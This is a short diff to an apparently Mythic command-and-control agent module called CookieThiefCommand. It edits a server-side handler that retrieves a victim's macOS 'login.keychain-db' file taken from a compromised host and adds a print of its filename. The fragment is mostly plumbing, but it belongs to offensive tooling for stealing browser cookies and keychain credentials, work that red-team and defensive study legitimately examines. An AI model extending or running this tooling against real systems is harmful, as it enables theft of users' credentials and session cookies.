@@ -57,10 +57,10 @@ class CookieThiefCommand(CommandBase):
         pass
 
     async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
-        getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,
-            filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
+        getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
         if getkeychainDBResp.status == "success":
             getkeychainDBResp = getkeychainDBResp.response[0]
+            print("Filename: " + getkeychainDBResp["filename"])
             sys.stdout.flush()
         else:
             print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
